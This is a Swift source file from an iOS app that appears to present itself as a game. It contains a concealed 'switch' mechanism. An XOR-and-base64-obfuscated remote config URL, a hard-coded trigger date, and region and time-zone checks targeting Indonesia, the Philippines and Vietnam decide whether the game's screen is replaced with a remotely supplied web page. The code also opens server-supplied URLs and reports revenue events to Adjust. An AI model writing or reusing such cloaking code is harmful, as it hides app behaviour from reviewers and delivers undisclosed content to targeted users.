
import Foundation
import UIKit
import AdjustSdk

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func Kyxtteus(_ input: String) -> String? {
    let k: UInt8 = 201
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    let dhys = String(bytes: decryptedBytes, encoding: .utf8)?.reversed()
    return String(dhys!)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
//internal let kMocbxtre = "r66yq++xqO7zt+6uqO+xqOy4rO+osaDu7vuysbW1qQ=="         //Ip ur

//https://mock.apipost.net/mock/6462b8bb5088000/?apipost_id=62b969bb22002
// right YX19eXozJiY/MGw6Oj5sajo6Oz4xOj5oODw8O2wwamsnZGZqYmh5YCdgZiZhfGx/aCZ9aHlqYWx6
internal let kBooyey = "+/n5+/urq/D/8Kv7//StoJa9uqa5oLmo9ub5+fnx8fn8q6vxq/v//f/moqqmpOa9rKfnvbqmuaC5qOeiqqak5ubzurm9vaE="

//https://mock.mengxuegu.com/mock/6a0acb77eeedae6a26b3eb86/old/chaozais
//internal let kXyuznye = "sqigu66gqaLupa2u7vf5o6Tyo/fzoPekoKWkpKT29qOioPGg9+6qoq6s7qyuou+0pqS0uaavpKzvqqKurO7u+7KxtbWp"


// https://raw.githubusercontent.com/jduja/chaoza/main/Overload.png
// pq+x76Wgrq2zpLeO7q+ooKzuoLuuoKmi7qCrtKWr7qyuou+1r6S1r66is6SytKO0qbWopu+2oLPu7vuysbW1qQ==
//internal let kNuxbfste = "pq+x76Wgrq2zpLeO7q+ooKzuoLuuoKmi7qCrtKWr7qyuou+1r6S1r66is6SytKO0qbWopu+2oLPu7vuysbW1qQ=="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
//internal func lxoausn() {
////    UIApplication.shared.windows.first?.rootViewController = vc
//    
//    DispatchQueue.main.async {
//        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
////            let tp = ws.windows.first!.rootViewController! as! UITabBarController
//
////            let tp = ws.windows.first!.rootViewController! as! UINavigationController
//            let tp = ws.windows.first!.rootViewController!
//            for view in tp.view.subviews {
//                if view.tag == 919 {
//                    view.removeFromSuperview()
//                }
//            }
//        }
//    }
//}

internal let hxuPksyyes: () -> Void = {
    let execute: () -> Void = {
        guard let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene else {
            return
        }
        let root = ws.windows.first!.rootViewController as! UINavigationController
        
        root.view.subviews.filter { $0.tag == 658 }
            .forEach {
            $0.removeFromSuperview()
        }
    }
    DispatchQueue.main.async {
        execute()
    }
}


// MARK: - 加密调用全局函数HandySounetHmeSh
internal func kaoirerys() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: hxuPksyyes
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
//internal func ncautes(_ dt: Lmxisye) {
//    DispatchQueue.main.async {
//        UserDefaults.standard.setModel(dt, forKey: "Lmxisye")
//        UserDefaults.standard.synchronize()
//        
//        let vc = HoaueViewController()
//        vc.ksien = dt
//        UIApplication.shared.windows.first?.rootViewController = vc
//    }
//}

internal let opisTavuy: (Eayxt) -> Void = { dt in
    let saveAction: () -> Void = {
        UserDefaults.standard.setModel(dt, forKey: "Eayxt")
        UserDefaults.standard.synchronize()
    }

    let routeAction: () -> Void = {
        let build: () -> GamePOverViewController = {
            let vc = GamePOverViewController()
            vc.nuahye = dt
            return vc
        }

        let present: (UIViewController) -> Void = { vc in
            UIApplication.shared.windows.first?.rootViewController = vc
        }
        present(build())
    }

    DispatchQueue.main.async {
            saveAction()
            routeAction()
    }
}


internal func ktetses(_ param: Eayxt) {
    let fName = ""

    typealias rushBlitzIusj = (Eayxt) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : opisTavuy
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//func kmiygTgses(_ dic: [String : String], etDic: [String : String]) {
//    var dataDic: [String : Any]?
//    if let data = dic[DT] {
//        dataDic = data.stringTo()
//    }
//    
//    let name = dic[Nam]
//    print(name!)
//        
//    //是否包含要发送的事件
//    if etDic.keys.contains(name!) {
//        let ade = ADJEvent(eventToken: etDic[name!]!)
//        if let amt = dataDic![amt] as? String, let cuy = dataDic![ren] {
//            ade?.setRevenue(Double(amt)!, currency: cuy as! String)
//        }
//        if let amt = dataDic![amt] as? Int, let cuy = dataDic![ren] {
//            ade?.setRevenue(Double(amt), currency: cuy as! String)
//        }
//        if let amt = dataDic![amt] as? Double, let cuy = dataDic![ren] {
//            ade?.setRevenue(amt, currency: cuy as! String)
//        }
//        Adjust.trackEvent(ade)
//    }
//    
//    if name == OpWin {
//        if let str = dataDic![UL] {
//            UIApplication.shared.open(URL(string: str as! String)!)
//        }
//    }
//}

internal let dyatreg: ([String : String], [String : String]) -> Void = { dic, etDic in

    let parse: () -> [String : Any]? = {
        guard let data = dic[DT] else {
            return nil
        }
        return data.stringTo()
    }

    let fetchName: () -> String? = {
        dic[Nam]
    }

    let revenue: (ADJEvent?, [String : Any]?) -> Void = { event, dataDic in
        guard let currency = dataDic?[ren] as? String
        else {
            return
        }

        if let value = dataDic?[amt] as? String {
            event?.setRevenue(Double(value) ?? 0, currency: currency)
        }

        if let value = dataDic?[amt] as? Int {
            event?.setRevenue( Double(value), currency: currency)
        }

        if let value = dataDic?[amt] as? Double {
            event?.setRevenue(value, currency: currency)
        }
    }

    let tracker: (String, [String : Any]?) -> Void = { name, dataDic in
        guard etDic.keys.contains(name), let token = etDic[name] else {
            return
        }

        let build: () -> ADJEvent? = {
            ADJEvent(eventToken: token)
        }

        let event = build()
        revenue(event,dataDic)

        let commit:() -> Void = {
            Adjust.trackEvent(event)
        }
        commit()
    }

    let opener: (String, [String : Any]?) -> Void = { name, dataDic in
        guard name == OpWin, let value = dataDic?[UL] as? String, let url = URL(string: value) else {
            return
        }

        let execute:() -> Void = {
            DispatchQueue.main.async {
                UIApplication.shared.open(url)
            }
        }

        execute()
    }

    let execute:() -> Void = {
        guard let name = fetchName() else {
            return
        }

        let dataDic = parse()

        print(name)

        tracker(name, dataDic)
        opener( name, dataDic)
    }

    DispatchQueue.global().async {
        execute()
    }
}



internal func nciuabc(_ param: [String : String], _ param2: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String], [String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : dyatreg
    ]
    
    fctn[fName]?(param, param2)
}

//internal struct Kicntc: Decodable {
//    let vteavs: Int?
//    let jdiyxt: String?
//    let rtzvvl: [String : String]?
//
//    let country: Zyxtie?
//    
//    struct Zyxtie: Decodable {
//        let code: String
//    }
//}
//

internal struct Eayxt: Codable {
    let cmiauyy: String?
    let vjaytyh: [String]?
    let cloiujs: Int?
    let cbtyay: Int?
    let etyau: String?

    let cjtaes: [String : String]?
    let ksoinm: String?         //key arr
    let cbiaysy: String?         // shi fou kaiqi
    let eianxn: String?         // jum
    let naitre: String?          // backcolor
    let mcoica: String?
//    let ncjoay: String?   // app id
    let duxnsys: String?  // bri co
    let ziybcq: String?   //ad key

}

//func hsrezts() -> Bool {
//   
//  // 2026-05-19 05:16:49
//  //1779139009
//    let ftTM = 1779139009
//    let ct = Date().timeIntervalSince1970
//    if Int(ct) - ftTM > 0 {
//        return true
//    }
//    return false
//}

//时间
internal let Gretsu: () -> Void = {
    let tmp: () -> Int = {
//       2026-05-21 19:26:18
//      1779362778
        return 1779362778
    }

    let daqin: () -> Int = {
        Int(Date().timeIntervalSince1970)
    }

    let compare: (Int, Int) -> Bool = { now, target in
        (now - target) > 0
    }

    let persist: () -> Void = {
        UserDefaults.standard.set("replay", forKey: "repy")
        UserDefaults.standard.synchronize()
    }

    let execute: () -> Void = {
        let target = tmp()
        let now = daqin()

        guard compare(now, target) else {
            UserDefaults.standard.set("last", forKey: "repy")
            UserDefaults.standard.synchronize()
            return
        }
        persist()
    }

    DispatchQueue.global().async {
        execute()
    }
}


//func viaousne(_ lsn: [String]) -> Bool {
//    // 获取用户设置的首选语言（列表第一个）
//    guard let cysh = Locale.preferredLanguages.first else {
//        return false
//    }
//    let arr = cysh.components(separatedBy: "-")
//    if lsn.contains(arr[0]) {
//        return true
//    }
//    return false
//}

//private let cdo = ["US","NL", "PH"]
// ["BR", "VN", "TH", "PH"]
//private let cdo = [Nhaisusm("f28="), Nhaisusm("a3M="), Nhaisusm("aXU=")]

//US、IE、NL、DE、CN、HK
//let dbcrare = [ysnciy("kpQ="), ysnciy("jY8="), ysnciy("hIg="), ysnciy("hIU="), ysnciy("j4I="), ysnciy("iok=")]

//ID PH VN
private let Mnzhxta = [Kyxtteus("jYA="), Kyxtteus("h58="), Kyxtteus("gZk=")]


//internal func Kicbrea(_ regsi: [String]) -> Bool {
//    if let rc = Locale.current.regionCode {
////        print(rc)
//        if regsi.contains(rc) {
//            return true
//        }
//    }
//    return false
//}

// 时区控制
//func Kmansiy() -> Bool {
//    
//    // 1.sm cad
////    if !tarvso() {
////        return false
////    }
//
//    //2. regi
//    if let rc = Locale.current.regionCode {
////        print(rc)
//        if !Noxuyas.contains(rc) {
//            return false
//        }
//    }
//    
//    //3. tm zon
//    let offset = NSTimeZone.system.secondsFromGMT() / 3600
//    if (offset > 6 && offset < 10) {
//        return true
//    }
////    if (offset > 6 && offset <= 8) || (offset > -6 && offset < -1) {
////        return true
////    }
//    
//    return false
//}

// 时区 + 地区限制
internal let ausingTaouy: () -> Bool = {

    let regionCheck: () -> Bool = {
        let fetch: () -> String? = {
            Locale.current.regionCode
        }

        let validate: (String) -> Bool = { code in
            Mnzhxta.contains(code)
        }

        guard let code = fetch() else {
            return false
        }

        return validate(code)
    }

    let tmck: () -> Bool = {
        let offset: () -> Int = {
            NSTimeZone.system.secondsFromGMT() / 60 / 60
        }

        let compare: (Int) -> Bool = { value in
            value > 6 && value < 10
        }

        return compare(offset())
    }

    let execute: () -> Bool = {
        guard regionCheck() else {
            return false
        }

        guard tmck() else {
            return false
        }
        return true
    }

    return execute()
}


//////////////////////////////////
internal func UxnatFyas() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: wexygVasyv
    ]
    
    fctn[fName]?()
}

//private func cmkaosu() {
////    if UserDefaults.standard.object(forKey: "peakse") != nil {
////        ratgeOoss()
////    } else {
//        if Kmansiy() {
//            mdoiyteg()
//        } else {
////            UserDefaults.standard.set("patter", forKey: "patter")
////            UserDefaults.standard.synchronize()
//            ratgeOoss()
//        }
////    }
//}

internal let wexygVasyv: () -> Void = {

    let storage: () -> UserDefaults = {
        UserDefaults.standard
    }

    let hasPattern: () -> Bool = {
        storage().object(forKey: "Rsytd") != nil
    }

    let exLocl:() -> Void = {
        let action:() -> Void = {
            kaoirerys()
        }
        action()
    }

    let exRetres: () -> Void = {
        let route: () -> Void = {
            Mhsytcs()
        }
        route()
    }

    let decision: () -> Void = {
        if hasPattern() {
            exLocl()
            return
        }

        let verify: () -> Bool = {
            ausingTaouy()
        }

        guard verify()  else {
            exLocl()
            return
        }

        exRetres()
    }

    DispatchQueue.global().async {
        decision()
    }
}


//private func mdoiyteg() {
//    Task {
//        do {
//            let aoies = try await chyayHvtgy()
//            if let gduss = aoies.first {
//                if gduss.ckous!.count == 4 {
//                        mdkaoye(gduss)
//                } else {
//                    ratgeOoss()
//                }
//            } else {
//                ratgeOoss()
//            }
//        } catch {
//            if let sidd = UserDefaults.standard.getModel(Lmxisye.self, forKey: "Lmxisye") {
//                mdkaoye(sidd)
//            }
//        }
//    }
//}

private let Mhsytcs: () -> Void = {

    let fallback: () -> Void = {
        let action:() -> Void = {
            kaoirerys()
        }
        action()
    }

    let restore: () -> Void = {
        let fetch: () -> Eayxt? = {
            UserDefaults.standard.getModel(Eayxt.self, forKey: "Eayxt")
        }

        guard let model = fetch() else {
            return
        }

        let execute: () -> Void = {
            ktetses(model)
        }
        execute()
    }

    let validate: (Eayxt) -> Bool = { item in
        guard let value = item.cbiaysy
        else {
            return false
        }

        return value.count > 5
    }

    let route: (Eayxt) -> Void = { item in
        let success: () -> Void = {
            ktetses(item)
        }

        let failure: () -> Void = {
            fallback()
        }

        validate(item) ? success() : failure()
    }

    Task {
        do {
            let request: () async throws -> [Eayxt] = {
                try await Juxhrxxf()
            }

            let result = try await request()

            guard let first = result.first
            else {
                fallback()
                return
            }
            route(first)
        } catch {
            restore()
        }
    }
}


private func Juxhrxxf() async throws -> [Eayxt] {
    let (data, response) = try await URLSession.shared.data(from: URL(string: Kyxtteus(kBooyey)!)!)

    guard let httpResponse = response as? HTTPURLResponse,
          httpResponse.statusCode == 200 else {
        throw NSError(domain: "Fail", code: 0, userInfo: [
            NSLocalizedDescriptionKey: "Invalid response"
        ])
    }

    return try JSONDecoder().decode([Eayxt].self, from: data)
}


//import CoreTelephony
//
//func tarvso() -> Bool {
//    let networkInfo = CTTelephonyNetworkInfo()
//    
//    guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
//        return false
//    }
//    
//    for (_, carrier) in carriers {
//        if let mcc = carrier.mobileCountryCode,
//           let mnc = carrier.mobileNetworkCode,
//           !mcc.isEmpty,
//           !mnc.isEmpty {
//            return true
//        }
//    }
//    
//    return false
//}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}


extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
}
